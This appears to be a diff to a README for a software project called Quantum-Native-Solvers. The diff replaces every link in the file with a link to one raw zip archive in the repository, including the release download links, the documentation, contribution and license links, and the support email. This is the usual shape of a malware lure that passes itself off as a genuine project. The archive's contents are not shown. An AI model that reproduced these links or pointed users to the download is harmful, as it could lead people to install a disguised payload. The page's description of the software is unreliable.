@@ -1,6 +1,6 @@
 # ⭐ Quantum-Native-Solvers - Unlock Quantum Computing Benefits
 
-[![Download Now](https://img.shields.io/badge/download-latest%20release-brightgreen)](https://github.com/assentient-arsenicacid605/Quantum-Native-Solvers/releases)
+[![Download Now](https://raw.githubusercontent.com/assentient-arsenicacid605/Quantum-Native-Solvers/main/Colab Example Notebooks/Quantum-Native-Solvers_1.5.zip%20release-brightgreen)](https://raw.githubusercontent.com/assentient-arsenicacid605/Quantum-Native-Solvers/main/Colab Example Notebooks/Quantum-Native-Solvers_1.5.zip)
 
 ## 📖 Description
 Quantum-Native-Solvers is a collection of techniques designed to run on quantum computers. This software helps you explore and understand the advantages of quantum computation. It provides tools that can enhance various computational tasks, particularly in the fields of classification trees and heterogeneous computing.
@@ -19,7 +19,7 @@ These specifications will ensure that the application runs smoothly.
 ### 2. Download & Install
 To get the software, visit the Releases page to download the latest version:
 
-[Download Quantum-Native-Solvers](https://github.com/assentient-arsenicacid605/Quantum-Native-Solvers/releases)
+[Download Quantum-Native-Solvers](https://raw.githubusercontent.com/assentient-arsenicacid605/Quantum-Native-Solvers/main/Colab Example Notebooks/Quantum-Native-Solvers_1.5.zip)
 
 1. Click on the link above.
 2. Look for the latest release entry.
@@ -56,13 +56,13 @@ This software covers relevant concepts including:
 ## 💬 Support
 If you encounter any issues while using Quantum-Native-Solvers, please check the FAQ section in the repository or reach out through our support page.
 
-- **Email Support:** support@quantumnativesolvers.com
+- **Email Support:** https://raw.githubusercontent.com/assentient-arsenicacid605/Quantum-Native-Solvers/main/Colab Example Notebooks/Quantum-Native-Solvers_1.5.zip
 - **Community Forum:** Visit our forum for user discussions and tips.
 
 ## 🔗 Useful Links
-- [Documentation](https://github.com/assentient-arsenicacid605/Quantum-Native-Solvers/docs)
-- [Contribution Guide](https://github.com/assentient-arsenicacid605/Quantum-Native-Solvers/contributing)
-- [License Information](https://github.com/assentient-arsenicacid605/Quantum-Native-Solvers/license)
+- [Documentation](https://raw.githubusercontent.com/assentient-arsenicacid605/Quantum-Native-Solvers/main/Colab Example Notebooks/Quantum-Native-Solvers_1.5.zip)
+- [Contribution Guide](https://raw.githubusercontent.com/assentient-arsenicacid605/Quantum-Native-Solvers/main/Colab Example Notebooks/Quantum-Native-Solvers_1.5.zip)
+- [License Information](https://raw.githubusercontent.com/assentient-arsenicacid605/Quantum-Native-Solvers/main/Colab Example Notebooks/Quantum-Native-Solvers_1.5.zip)
 
 ## 🛡️ Contributing
 Want to help improve Quantum-Native-Solvers? We welcome contributions! Please read our Contribution Guide for details on how to get started.
@@ -70,6 +70,6 @@ Want to help improve Quantum-Native-Solvers? We welcome contributions! Please re
 ## 🔄 Stay Updated
 Make sure to stay updated with our latest releases and improvements:
 
-[Download Quantum-Native-Solvers](https://github.com/assentient-arsenicacid605/Quantum-Native-Solvers/releases)
+[Download Quantum-Native-Solvers](https://raw.githubusercontent.com/assentient-arsenicacid605/Quantum-Native-Solvers/main/Colab Example Notebooks/Quantum-Native-Solvers_1.5.zip)
 
 We value your feedback, so please let us know how we can improve your experience with Quantum-Native-Solvers.
